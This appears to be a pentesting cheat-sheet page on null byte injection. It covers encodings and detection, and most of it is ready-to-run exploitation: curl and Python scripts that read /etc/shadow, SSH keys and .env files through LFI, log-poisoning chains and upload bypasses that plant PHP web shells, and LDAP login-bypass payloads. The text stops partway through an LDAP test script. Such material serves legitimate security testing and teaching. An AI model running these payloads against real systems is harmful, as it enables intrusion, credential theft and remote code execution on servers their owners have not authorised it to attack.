---
title: Null Byte Injection
description: Null Byte Injection — Bypass Filters, Truncate Strings & Exploit Parsers
navigation:
  icon: i-lucide-binary
  title: Null Byte Injection
---

## Null Byte Injection

::badge
**High Severity — CWE-158 / CWE-626 / CWE-20**
::

::note
A Null Byte (`%00`, `\x00`, `\0`) is a special character with a value of zero that acts as a string terminator in C/C++-based languages and low-level system functions. When a higher-level language (PHP, Python, Java, Perl, Ruby) passes user input containing a null byte to underlying C-based system calls — **the C function terminates the string at the null byte**, while the application-level language may see the full string. This mismatch creates exploitable gaps in validation, file access, log injection, authentication, and filter bypasses.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="How Null Byte Injection Works"}
  1. Application receives user input containing `%00` (URL-encoded null)
  2. Application-layer validation sees the **full string including bytes after null**
  3. Input is passed to a system-level function (file open, command exec, LDAP query)
  4. The C-level function encounters `\x00` and **treats it as end of string**
  5. Everything after the null byte is silently discarded
  6. Attacker bypasses file extension checks, path validation, authentication filters

  **Example Flow:**
  - User submits: `../../etc/passwd%00.png`
  - PHP validation sees: `../../etc/passwd%00.png` → extension is `.png` → PASS
  - C-level `fopen()` sees: `../../etc/passwd` → null terminates → opens `/etc/passwd`
  :::

  :::accordion-item{icon="i-lucide-history" label="Historical Context & Modern Relevance"}
  | Era | Status | Details |
  | --- | ------ | ------- |
  | PHP < 5.3.4 | **Fully Vulnerable** | `fopen()`, `include()`, `file_get_contents()` all truncate at null |
  | PHP 5.3.4+ | **Partially Patched** | Core functions reject null bytes, but some extensions still vulnerable |
  | PHP 7/8 | **Mostly Fixed** | `TypeError` on null bytes in filesystem functions, but edge cases exist |
  | Java < 7u40 | **Vulnerable** | `File()` constructor accepted null bytes |
  | Java 7u40+ | **Patched** | `InvalidPathException` thrown on null bytes |
  | Perl | **Still Vulnerable** | System calls truncate at null, Perl strings don't |
  | Python 2.x | **Vulnerable** | C extension functions truncate at null |
  | Python 3.x | **Partially Patched** | `os.open()` rejects null bytes since 3.1, but some libs still vulnerable |
  | Node.js | **Context-dependent** | Buffer handling can be exploited, `fs` functions patched in recent versions |
  | Ruby | **Context-dependent** | Fixed in Ruby 2.x+ for core IO, edge cases in gems |
  | ASP Classic | **Vulnerable** | COM objects truncate at null |
  | .NET | **Mostly Safe** | Managed strings handle nulls, but P/Invoke and native interop vulnerable |
  | C/C++ | **By Design** | Null is always string terminator |
  | LDAP Libraries | **Often Vulnerable** | Many LDAP implementations truncate at null |
  | XML Parsers | **Varies** | Some parsers fail on null, others truncate |

  ::warning
  Even in "patched" languages, null byte injection remains relevant in: custom C extensions, FFI calls, native library bindings, LDAP queries, header injection, log poisoning, WAF bypasses, database drivers, and serialization formats.
  ::
  :::

  :::accordion-item{icon="i-lucide-target" label="Attack Surface Categories"}
  - **File Inclusion / File Read** — Truncate forced extensions (`include($_GET['page'] . '.php')`)
  - **File Upload Bypass** — Pass extension validation while writing different file type
  - **Path Traversal Enhancement** — Bypass suffix appending on path traversal payloads
  - **Authentication Bypass** — Truncate passwords, usernames, or tokens
  - **LDAP Injection** — Terminate LDAP filters prematurely
  - **Command Injection** — Bypass command sanitization
  - **Log Injection / Poisoning** — Inject null bytes to break log parsers
  - **WAF / Filter Bypass** — Evade pattern matching that doesn't handle nulls
  - **Header Injection** — Terminate headers to inject new ones (HTTP response splitting)
  - **SQL Injection Enhancement** — Bypass input length or pattern filters
  - **XML/JSON Injection** — Break parser assumptions about string content
  - **Email Header Injection** — Truncate email addresses to bypass domain validation
  - **Certificate Validation Bypass** — Null byte in CN/SAN fields (CVE-2009-2408)
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Impact Scenarios"}
  | Impact | Description | Severity |
  | ------ | ----------- | -------- |
  | **Remote Code Execution** | Include/execute arbitrary files via LFI null byte truncation | Critical |
  | **Arbitrary File Read** | Read system files bypassing extension enforcement | High |
  | **Authentication Bypass** | Truncate credentials to match shorter valid values | Critical |
  | **File Upload RCE** | Upload `.php` disguised as `.jpg` via null byte in filename | Critical |
  | **LDAP Auth Bypass** | Terminate LDAP filter to bypass authentication | Critical |
  | **WAF Evasion** | Smuggle payloads past WAF null byte handling gaps | High |
  | **Log Tampering** | Break log integrity, enable log injection chains | Medium |
  | **Information Disclosure** | Read configuration files, source code, credentials | High |
  | **Directory Listing** | Bypass path restrictions to list arbitrary directories | Medium |
  | **Certificate Spoofing** | Null byte in SSL certificate CN to impersonate domains | Critical |
  :::
::

---

## Null Byte Encoding Reference

::tip
Different contexts require different null byte representations. Test all encoding forms against your target — WAFs and parsers handle each differently.
::

::collapsible

| Encoding | Representation | Context |
| -------- | -------------- | ------- |
| URL Encoded | `%00` | HTTP parameters, URLs, query strings |
| Double URL Encoded | `%2500` | WAF bypass, double-decode scenarios |
| Unicode | `%u0000` | IIS, ASP, Java-based systems |
| HTML Entity (Decimal) | `&#0;` or `&#00;` | HTML/XML context |
| HTML Entity (Hex) | `&#x0;` or `&#x00;` | HTML/XML context |
| UTF-8 Overlong (2-byte) | `%c0%80` | Java, Tomcat (CVE-2007-0450), Unicode normalization |
| UTF-8 Overlong (3-byte) | `%e0%80%80` | Deep encoding bypass |
| UTF-8 Overlong (4-byte) | `%f0%80%80%80` | Edge cases |
| Raw Hex | `\x00` | Python, Ruby, Perl scripts, raw requests |
| Octal | `\0` or `\00` or `\000` | C, PHP, Bash, Perl |
| Backslash Null | `\0` | PHP strings, regex contexts |
| Caret Notation | `^@` | Terminal, text editors |
| Base64 (null byte) | `AA==` | Base64-encoded payloads |
| JSON Unicode | `\u0000` | JSON payloads |
| XML CDATA null | `<![CDATA[\x00]]>` | XML injection |
| PowerShell | `` `0 `` | Windows PowerShell |
| Hex literal | `0x00` | Programming contexts |
| Python bytes | `b'\x00'` | Python raw bytes |

::

---

## Reconnaissance & Detection

### Identifying Null Byte Vulnerable Endpoints

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Automated Discovery"}
  ```bash
  # ── Crawl target for parameterized endpoints ──
  katana -u https://target.com -d 5 -jc -kf -o all_urls.txt
  
  # Filter for file-inclusion and path-like parameters
  grep -iE "[?&](file|page|path|dir|doc|folder|template|include|load|read|fetch|view|content|module|action|url|src|lang|locale|cat|category|download|img|image|report|log|config|style|layout|theme)=" all_urls.txt | sort -u > file_params.txt
  
  # ── Paraminer / Arjun — discover hidden parameters ──
  arjun -u https://target.com/index.php -m GET POST -t 20 -o arjun_params.json
  
  # ── GAU + Wayback for historical params ──
  echo "target.com" | gau --threads 10 | grep -iE "[?&](file|page|path|include|template|load|view|doc)=" | sort -u > historical_params.txt
  
  # ── ParamSpider ──
  paramspider -d target.com -o paramspider_output.txt
  grep -iE "file|page|path|include|load|view|template" paramspider_output.txt > interesting_params.txt
  
  # ── Nuclei null byte templates ──
  nuclei -u https://target.com -t http/vulnerabilities/ -tags lfi,null-byte,path-traversal -severity critical,high
  
  # ── Dalfox for reflected parameter detection ──
  cat file_params.txt | dalfox pipe --skip-bav -o reflected_params.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Manual Parameter Identification"}
  ```bash
  # ── Common parameter names vulnerable to null byte injection ──
  PARAMS=(
    "file" "page" "path" "dir" "document" "folder" "root"
    "template" "include" "inc" "require" "load" "read"
    "fetch" "view" "content" "module" "action" "layout"
    "theme" "style" "lang" "locale" "cat" "category"
    "download" "img" "image" "report" "log" "config"
    "src" "source" "url" "redirect" "rurl" "return"
    "filename" "filepath" "name" "resource" "rsc"
    "pdf" "doc" "attachment" "data" "input" "output"
  )
  
  # Probe each parameter
  for param in "${PARAMS[@]}"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/index.php?${param}=test")
      if [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ]; then
          echo "[${STATUS}] ?${param}=test"
      fi
  done
  
  # ── Test each discovered parameter with null byte ──
  while IFS= read -r url; do
      # Extract parameter name
      PARAM=$(echo "$url" | grep -oP '[?&]\K[^=]+(?==)')
      BASE=$(echo "$url" | cut -d'?' -f1)
      
      # Test with null byte
      for payload in "%00" "%2500" "%c0%80" "%00.html"; do
          RESP=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
            "${BASE}?${PARAM}=../../../etc/passwd${payload}")
          echo "[${RESP}] ${PARAM} -> ${payload}"
      done
  done < file_params.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-globe" label="Technology Fingerprinting"}
  ```bash
  # ── Identify backend technology (determines null byte viability) ──
  
  # HTTP headers
  curl -sI https://target.com | grep -iE "x-powered-by|server|x-aspnet|x-generator|x-runtime"
  
  # Whatweb
  whatweb https://target.com -v --color=never
  
  # Wappalyzer CLI
  wappalyzer https://target.com
  
  # Error-based fingerprinting
  curl -s "https://target.com/nonexistent.php" | head -20
  curl -s "https://target.com/nonexistent.asp" | head -20
  curl -s "https://target.com/nonexistent.jsp" | head -20
  
  # PHP version detection (null byte viability indicator)
  curl -sI https://target.com | grep -i "x-powered-by"
  # PHP < 5.3.4 = HIGH chance of null byte vulnerability
  # PHP 5.3.4-5.6 = Some edge cases
  # PHP 7+ = Mostly patched (check custom extensions)
  
  # Perl detection
  curl -s "https://target.com/cgi-bin/" -o /dev/null -w "%{http_code}"
  curl -s "https://target.com/test.pl" -o /dev/null -w "%{http_code}"
  curl -s "https://target.com/test.cgi" -o /dev/null -w "%{http_code}"
  # Perl = HIGH chance of null byte vulnerability (still works)
  
  # Java version
  curl -sI https://target.com | grep -i "server"
  # Look for: Apache-Coyote, Tomcat, Jetty, GlassFish
  # Java < 7u40 = Vulnerable
  
  # ASP/IIS detection
  curl -sI https://target.com | grep -i "server: Microsoft-IIS"
  # ASP Classic = Vulnerable
  # ASP.NET = Edge cases in native interop
  
  # Check for older PHP via phpinfo exposure
  curl -s "https://target.com/phpinfo.php" | grep -i "php version"
  curl -s "https://target.com/info.php" | grep -i "php version"
  curl -s "https://target.com/test.php" | grep -i "php version"
  
  ffuf -u "https://target.com/FUZZ" \
    -w <(echo -e "phpinfo.php\ninfo.php\ntest.php\nphp_info.php\ni.php\npi.php") \
    -mc 200
  ```
  :::
::

### Baseline Response Analysis

::code-group
```bash [Response Fingerprinting]
# ── Establish baseline responses for comparison ──

TARGET="https://target.com/index.php"
PARAM="page"

# Normal request
curl -s "${TARGET}?${PARAM}=home" -o baseline_normal.txt -D baseline_headers.txt
NORMAL_SIZE=$(wc -c < baseline_normal.txt)
NORMAL_HASH=$(md5sum baseline_normal.txt | cut -d' ' -f1)
echo "[*] Normal: size=${NORMAL_SIZE} hash=${NORMAL_HASH}"

# Invalid file request
curl -s "${TARGET}?${PARAM}=nonexistent_file_xyz" -o baseline_invalid.txt
INVALID_SIZE=$(wc -c < baseline_invalid.txt)
INVALID_HASH=$(md5sum baseline_invalid.txt | cut -d' ' -f1)
echo "[*] Invalid: size=${INVALID_SIZE} hash=${INVALID_HASH}"

# Path traversal without null byte
curl -s "${TARGET}?${PARAM}=../../../etc/passwd" -o baseline_traversal.txt
TRAVERSAL_SIZE=$(wc -c < baseline_traversal.txt)
echo "[*] Traversal (no null): size=${TRAVERSAL_SIZE}"

# Path traversal WITH null byte
curl -s "${TARGET}?${PARAM}=../../../etc/passwd%00" -o baseline_null.txt
NULL_SIZE=$(wc -c < baseline_null.txt)
echo "[*] Traversal (null byte): size=${NULL_SIZE}"

# Compare — if NULL_SIZE differs significantly from INVALID_SIZE, null byte may work
if [ "$NULL_SIZE" != "$INVALID_SIZE" ]; then
    echo "[+] POTENTIAL NULL BYTE INJECTION — response size differs!"
    echo "[+] Check baseline_null.txt for /etc/passwd content"
    grep -c "root:" baseline_null.txt && echo "[+] CONFIRMED — /etc/passwd content found!"
fi

# Diff responses
diff baseline_invalid.txt baseline_null.txt
```

```bash [Automated Baseline Comparison]
#!/bin/bash
# null_byte_detector.sh — Detect null byte injection via response analysis

TARGET="$1"    # e.g., https://target.com/index.php?page=
WORDLIST="$2"  # File with test values

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url_with_param=> [wordlist]"
    echo "Example: $0 'https://target.com/index.php?page=' lfi_payloads.txt"
    exit 1
fi

# Get baseline
BASELINE_SIZE=$(curl -s "${TARGET}nonexistent_xyz_$$" -o /dev/null -w "%{size_download}")
BASELINE_STATUS=$(curl -s "${TARGET}nonexistent_xyz_$$" -o /dev/null -w "%{http_code}")
echo "[*] Baseline: status=${BASELINE_STATUS} size=${BASELINE_SIZE}"
echo "---"

# Null byte payloads
PAYLOADS=(
    "../../../etc/passwd%00"
    "../../../etc/passwd%00.html"
    "../../../etc/passwd%00.php"
    "../../../etc/passwd%00.jpg"
    "../../../etc/passwd%00.txt"
    "../../../etc/passwd%2500"
    "../../../etc/passwd%c0%80"
    "....//....//....//etc/passwd%00"
    "..%252f..%252f..%252fetc/passwd%00"
    "../../../etc/passwd%00%00"
    "../../../etc/passwd\x00"
    "../../../etc/passwd%u0000"
    "..\\..\\..\\etc\\passwd%00"
    "../../../etc/passwd%00.xml"
    "../../../etc/passwd%00.json"
    "../../../etc/passwd%00.css"
    "../../../etc/passwd%00.js"
    "/etc/passwd%00"
    "file:///etc/passwd%00"
    "php://filter/convert.base64-encode/resource=../../../etc/passwd%00"
)

for payload in "${PAYLOADS[@]}"; do
    RESP_SIZE=$(curl -s "${TARGET}${payload}" -o /tmp/null_test_$$.txt -w "%{size_download}")
    RESP_STATUS=$(curl -s "${TARGET}${payload}" -o /dev/null -w "%{http_code}")
    
    # Check for indicators
    HAS_PASSWD=$(grep -c "root:" /tmp/null_test_$$.txt 2>/dev/null)
    SIZE_DIFF=$((RESP_SIZE - BASELINE_SIZE))
    
    INDICATOR=" "
    [ "$HAS_PASSWD" -gt 0 ] && INDICATOR="+"
    [ "$SIZE_DIFF" -gt 100 ] && INDICATOR="~"
    [ "$RESP_STATUS" = "500" ] && INDICATOR="E"
    
    echo "[${INDICATOR}] [${RESP_STATUS}] size=${RESP_SIZE} (diff=${SIZE_DIFF}) ${payload}"
    
    if [ "$HAS_PASSWD" -gt 0 ]; then
        echo "    [!!!] /etc/passwd CONTENT DETECTED!"
    fi
done

rm -f /tmp/null_test_$$.txt
```
::

---

## Exploitation Techniques

### File Inclusion — Null Byte Truncation

::warning
The most classic null byte attack: bypass forced file extensions in `include()`, `require()`, `fopen()`, and similar functions.
::

::tabs
  :::tabs-item{icon="i-lucide-file" label="LFI Extension Bypass"}
  ```bash
  # ── Target code pattern (PHP < 5.3.4): ──
  # include($_GET['page'] . '.php');
  # Expected: page=home → include('home.php')
  # Attack:   page=../../../etc/passwd%00 → include('../../../etc/passwd\0.php')
  #           C-level fopen sees: '../../../etc/passwd' (truncated at null)
  
  # ── Basic null byte LFI ──
  curl -s "https://target.com/index.php?page=../../../etc/passwd%00"
  curl -s "https://target.com/index.php?page=../../../etc/passwd%00.php"
  curl -s "https://target.com/index.php?page=../../../etc/passwd%00.html"
  
  # ── Depth brute force with null byte ──
  for i in $(seq 1 15); do
      TRAVERSAL=$(printf '../%.0s' $(seq 1 $i))
      echo "[*] Depth $i: ${TRAVERSAL}etc/passwd%00"
      curl -s "https://target.com/index.php?page=${TRAVERSAL}etc/passwd%00" | grep -c "root:" | \
        xargs -I{} echo "    Hits: {}"
  done
  
  # ── Encoding variations for null byte ──
  # Standard
  curl -s "https://target.com/index.php?page=../../../etc/passwd%00"
  # Double encoded
  curl -s "https://target.com/index.php?page=../../../etc/passwd%2500"
  # Overlong UTF-8
  curl -s "https://target.com/index.php?page=../../../etc/passwd%c0%80"
  # Triple encoded
  curl -s "https://target.com/index.php?page=../../../etc/passwd%25%30%30"
  # Unicode
  curl -s "https://target.com/index.php?page=../../../etc/passwd%u0000"
  # Mixed encoding
  curl -s "https://target.com/index.php?page=%2e%2e/%2e%2e/%2e%2e/etc/passwd%00"
  
  # ── Read specific files with forced extension bypass ──
  FILES=(
      "/etc/passwd" "/etc/shadow" "/etc/hosts" "/etc/hostname"
      "/etc/apache2/apache2.conf" "/etc/nginx/nginx.conf"
      "/etc/mysql/my.cnf" "/etc/php/7.4/php.ini"
      "/proc/self/environ" "/proc/self/cmdline"
      "/proc/version" "/proc/self/status"
      "/var/log/apache2/access.log" "/var/log/apache2/error.log"
      "/var/log/auth.log" "/var/log/syslog"
      "/root/.bash_history" "/root/.ssh/id_rsa"
      "/home/www-data/.bash_history"
      "/var/www/html/wp-config.php" "/var/www/html/.env"
      "/var/www/html/config.php" "/var/www/html/db.php"
      "/app/.env" "/app/config/database.yml"
  )
  
  for file in "${FILES[@]}"; do
      DEPTH="../../../.."
      RESULT=$(curl -s "https://target.com/index.php?page=${DEPTH}${file}%00" 2>/dev/null)
      SIZE=${#RESULT}
      if [ "$SIZE" -gt 0 ]; then
          HAS_CONTENT=$(echo "$RESULT" | grep -cE "root:|password|secret|key|host|database" 2>/dev/null)
          if [ "$HAS_CONTENT" -gt 0 ]; then
              echo "[+] READABLE: ${file} (size: ${SIZE})"
          fi
      fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-file" label="Windows LFI with Null Byte"}
  ```bash
  # ── Windows-specific file paths with null byte truncation ──
  
  # Boot.ini
  curl -s "https://target.com/index.php?page=../../../boot.ini%00"
  curl -s "https://target.com/index.php?page=..\\..\\..\\boot.ini%00"
  
  # Windows system files
  curl -s "https://target.com/index.php?page=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00"
  curl -s "https://target.com/index.php?page=..\\..\\..\\windows\\win.ini%00"
  curl -s "https://target.com/index.php?page=..\\..\\..\\windows\\system.ini%00"
  curl -s "https://target.com/index.php?page=..\\..\\..\\windows\\system32\\config\\sam%00"
  
  # IIS config
  curl -s "https://target.com/index.php?page=..\\..\\..\\inetpub\\wwwroot\\web.config%00"
  curl -s "https://target.com/index.php?page=..\\..\\..\\windows\\system32\\inetsrv\\config\\applicationHost.config%00"
  
  # XAMPP / WAMP
  curl -s "https://target.com/index.php?page=..\\..\\..\\xampp\\apache\\conf\\httpd.conf%00"
  curl -s "https://target.com/index.php?page=..\\..\\..\\xampp\\mysql\\data\\mysql\\user.MYD%00"
  curl -s "https://target.com/index.php?page=..\\..\\..\\xampp\\passwords.txt%00"
  curl -s "https://target.com/index.php?page=..\\..\\..\\xampp\\phpMyAdmin\\config.inc.php%00"
  
  # Mixed separators (confuse normalizers)
  curl -s "https://target.com/index.php?page=..%5c..%2f..%5cwindows%2fsystem.ini%00"
  curl -s "https://target.com/index.php?page=../..\\../windows/win.ini%00"
  ```
  :::

  :::tabs-item{icon="i-lucide-file" label="PHP Wrapper + Null Byte"}
  ```bash
  # ── PHP stream wrappers with null byte truncation ──
  
  # php://filter — Read source code as base64
  curl -s "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=index%00"
  curl -s "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=config%00"
  curl -s "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=../config%00"
  curl -s "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=../../../var/www/html/config%00"
  
  # Decode the base64 output
  curl -s "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=config%00" | \
    grep -oP '[A-Za-z0-9+/=]{20,}' | base64 -d
  
  # php://filter with multiple encodings (filter chain bypass)
  curl -s "https://target.com/index.php?page=php://filter/read=convert.base64-encode/resource=../../../etc/passwd%00"
  curl -s "https://target.com/index.php?page=php://filter/string.rot13/resource=config%00"
  curl -s "https://target.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=config%00"
  
  # data:// wrapper + null byte
  curl -s "https://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==%00"
  # Decodes to: <?php system($_GET['c']); ?>
  
  # expect:// wrapper + null byte (if allow_url_include=On)
  curl -s "https://target.com/index.php?page=expect://id%00"
  curl -s "https://target.com/index.php?page=expect://whoami%00"
  
  # zip:// wrapper + null byte
  curl -s "https://target.com/index.php?page=zip://uploads/evil.jpg%23shell%00"
  
  # phar:// wrapper + null byte
  curl -s "https://target.com/index.php?page=phar://uploads/evil.jpg/shell%00"
  ```
  :::

  :::tabs-item{icon="i-lucide-file" label="Log Poisoning + Null Byte"}
  ```bash
  # ── Chain: Log poisoning → LFI with null byte for RCE ──
  
  # Step 1: Inject PHP code into access log via User-Agent
  curl -s "https://target.com/" \
    -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
  
  # Step 2: Include the log file with null byte to bypass extension
  curl -s "https://target.com/index.php?page=../../../var/log/apache2/access.log%00&cmd=id"
  curl -s "https://target.com/index.php?page=../../../var/log/nginx/access.log%00&cmd=id"
  curl -s "https://target.com/index.php?page=../../../var/log/httpd/access_log%00&cmd=id"
  
  # Alternative log paths
  LOG_PATHS=(
      "/var/log/apache2/access.log"
      "/var/log/apache2/error.log"
      "/var/log/nginx/access.log"
      "/var/log/nginx/error.log"
      "/var/log/httpd/access_log"
      "/var/log/httpd/error_log"
      "/var/log/auth.log"
      "/var/log/mail.log"
      "/var/log/vsftpd.log"
      "/var/log/sshd.log"
      "/proc/self/fd/1"
      "/proc/self/environ"
      "/opt/lampp/logs/access_log"
      "/xampp/apache/logs/access.log"
  )
  
  for log in "${LOG_PATHS[@]}"; do
      RESULT=$(curl -s "https://target.com/index.php?page=../../../../${log}%00&cmd=id")
      if echo "$RESULT" | grep -q "uid="; then
          echo "[+] RCE via log poisoning: ${log}"
          break
      fi
  done
  
  # Step 3: SSH log poisoning (alternative vector)
  # Connect with PHP code as username
  ssh '<?php system($_GET["cmd"]); ?>'@target.com
  # Then include auth.log
  curl -s "https://target.com/index.php?page=../../../var/log/auth.log%00&cmd=id"
  
  # Step 4: SMTP log poisoning
  # Send email with PHP in headers
  swaks --to admin@target.com --from '<?php system($_GET["cmd"]); ?>'@attacker.com \
    --server target.com --header 'Subject: test'
  # Include mail log
  curl -s "https://target.com/index.php?page=../../../var/log/mail.log%00&cmd=id"
  
  # Step 5: /proc/self/environ poisoning
  curl -s "https://target.com/index.php?page=../../../proc/self/environ%00" \
    -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
    --data-urlencode "cmd=id"
  ```
  :::
::

### File Upload Bypass

::tabs
  :::tabs-item{icon="i-lucide-upload" label="Extension Validation Bypass"}
  ```bash
  # ── Bypass server-side extension checks using null byte in filename ──
  
  # Target code pattern:
  # $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
  # if ($ext == 'jpg') { move_uploaded_file(...); }
  # 
  # Attack: filename="shell.php%00.jpg"
  # PHP sees extension: .jpg → validation passes
  # Filesystem writes: shell.php (truncated at null)
  
  # ── cURL with null byte in filename ──
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.php%00.jpg" \
    -H "Cookie: session=TOKEN"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=avatar.php%00.png" \
    -H "Cookie: session=TOKEN"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=document.php%00.pdf" \
    -H "Cookie: session=TOKEN"
  
  # ── Multiple null byte positions ──
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.php%00.jpg%00.png"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell%00.php.jpg"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.php%00%00%00.jpg"
  
  # ── Encoding variations in filename ──
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.php%2500.jpg"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.php%c0%80.jpg"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.php%u0000.jpg"
  
  # ── Combined with other extension tricks ──
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.PHP%00.jpg"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.pHp%00.jpg"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.php5%00.jpg"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.phtml%00.jpg"
  
  curl -X POST https://target.com/upload.php \
    -F "file=@shell.php;filename=shell.php.jpg%00"
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Python Upload Script"}
  ```python [null_byte_upload.py]
  #!/usr/bin/env python3
  """Automated null byte file upload bypass testing"""
  import requests
  import urllib3
  import sys
  import time
  urllib3.disable_warnings()
  
  TARGET = "https://target.com/upload.php"
  COOKIE = {"session": "AUTH_TOKEN"}
  SHELL = b'<?php echo "NULL_BYTE_UPLOAD_SUCCESS"; system($_GET["cmd"]); ?>'
  
  # Null byte encoding variations
  null_variants = [
      "%00",
      "\x00",
      "%2500",
      "%c0%80",
      "%e0%80%80",
      "%f0%80%80%80",
      "%u0000",
      "\0",
  ]
  
  # Extension combinations
  payloads = []
  for null in null_variants:
      for ext in [".jpg", ".png", ".gif", ".pdf", ".doc", ".txt", ".html", ".xml"]:
          payloads.append(f"shell.php{null}{ext}")
          payloads.append(f"shell.phtml{null}{ext}")
          payloads.append(f"shell.php5{null}{ext}")
          payloads.append(f"shell.pHp{null}{ext}")
          payloads.append(f"shell{null}.php{ext}")
  
  print(f"[*] Testing {len(payloads)} filename variants")
  print(f"[*] Target: {TARGET}")
  print("-" * 60)
  
  for i, filename in enumerate(payloads):
      try:
          files = {"file": (filename, SHELL, "image/jpeg")}
          r = requests.post(TARGET, files=files, cookies=COOKIE, verify=False, timeout=10)
          
          indicator = " "
          if r.status_code == 200 and ("success" in r.text.lower() or "uploaded" in r.text.lower()):
              indicator = "+"
          elif r.status_code == 500:
              indicator = "E"
          
          print(f"[{indicator}] [{r.status_code}] {filename}")
          
          # If upload succeeded, try to access the shell
          if indicator == "+":
              # Try various possible paths
              for check_name in ["shell.php", "shell.phtml", "shell.php5"]:
                  for upload_dir in ["/uploads/", "/files/", "/media/", "/images/", "/static/"]:
                      check_url = f"https://target.com{upload_dir}{check_name}?cmd=id"
                      cr = requests.get(check_url, cookies=COOKIE, verify=False, timeout=5)
                      if "uid=" in cr.text or "NULL_BYTE_UPLOAD_SUCCESS" in cr.text:
                          print(f"    [!!!] SHELL ACCESSIBLE: {check_url}")
                          print(f"    [!!!] Response: {cr.text[:200]}")
          
      except Exception as e:
          print(f"[E] {filename}: {e}")
      
      time.sleep(0.3)
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Burp Raw Request"}
  ```text
  POST /upload.php HTTP/1.1
  Host: target.com
  Cookie: session=AUTH_TOKEN
  Content-Type: multipart/form-data; boundary=----Boundary123
  Content-Length: [calculated]
  
  ------Boundary123
  Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
  Content-Type: image/jpeg
  
  <?php system($_GET['cmd']); ?>
  ------Boundary123--
  
  
  # ── Burp Intruder positions ──
  # Position 1: filename="shell.§php%00§.jpg"
  # Payload list for null byte variants:
  php%00
  php%2500
  php%c0%80
  php%e0%80%80
  php%u0000
  php\x00
  phtml%00
  php5%00
  pHp%00
  PHP%00
  
  # Position 2: filename="shell.php%00.§jpg§"
  # Payload list for extensions:
  jpg
  jpeg
  png
  gif
  bmp
  pdf
  doc
  txt
  html
  xml
  csv
  
  # ── Intruder Cluster Bomb attack with both positions ──
  # This tests all combinations of null variants × extensions
  ```
  :::
::

### LDAP Injection via Null Byte

::tabs
  :::tabs-item{icon="i-lucide-database" label="LDAP Auth Bypass"}
  ```bash
  # ── LDAP null byte injection for authentication bypass ──
  
  # Target code pattern:
  # $filter = "(&(uid=" . $_POST['user'] . ")(userPassword=" . $_POST['pass'] . "))";
  # ldap_search($conn, $base_dn, $filter);
  
  # Attack: user=admin%00  pass=anything
  # Filter becomes: (&(uid=admin\0)(userPassword=anything))
  # LDAP C library sees: (&(uid=admin) — truncated, ignores password check
  
  # ── Basic LDAP null byte auth bypass ──
  curl -X POST https://target.com/login \
    -d "username=admin%00&password=doesntmatter"
  
  curl -X POST https://target.com/login \
    -d "username=admin%00)(&)(&(uid=*&password=anything"
  
  curl -X POST https://target.com/login \
    -d "username=admin%00)(%26)(%26(uid%3d*&password=x"
  
  # ── LDAP null byte with wildcard ──
  curl -X POST https://target.com/login \
    -d "username=*%00&password=anything"
  
  curl -X POST https://target.com/login \
    -d "username=adm*%00&password=anything"
  
  # ── Encoding variations ──
  curl -X POST https://target.com/login \
    -d "username=admin%2500&password=x"
  
  curl -X POST https://target.com/login \
    -d "username=admin%c0%80&password=x"
  
  # ── Test multiple usernames with null byte ──
  for user in admin administrator root sysadmin superadmin manager operator; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        https://target.com/login \
        -d "username=${user}%00&password=anything")
      echo "[${STATUS}] ${user}%00"
  done
  
  # ── LDAP search injection with null byte ──
  curl -s "https://target.com/search?user=*)(uid=*))(|(uid=*%00"
  curl -s "https://target.com/search?user=admin%00)(|(objectClass=*"
  
  # ── LDAP attribute extraction via null byte ──
  curl -s "https://target.com/search?user=admin%00)(userPassword=*"
  curl -s "https://target.com/search?user=admin%00)(mail=*"
  curl -s "https://target.com/search?user=admin%00)(telephoneNumber=*"
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="LDAP Automated Testing"}
  ```python [ldap_null_byte_test.py]
  #!/usr/bin/env python3
  """LDAP null byte injection automated tester"""
  import requests
  import urllib3
  urllib3.disable_warnings()
  
  TARGET = "https://target.com/login"
  
  payloads = {
      "username": [
          "admin%00",
          "admin%00)(&)(",
          "admin%00)(|(&(",
          "admin%00)(|(uid=*)",
          "*%00",
          "admin%2500",
          "admin%c0%80",
          "admin\x00",
          "admin%00)(%26)(uid%3d*",
          "admin%00)(objectClass=*",
          "*)(%00",
          "admin%00)(cn=*",
          "admin%00)(sn=*",
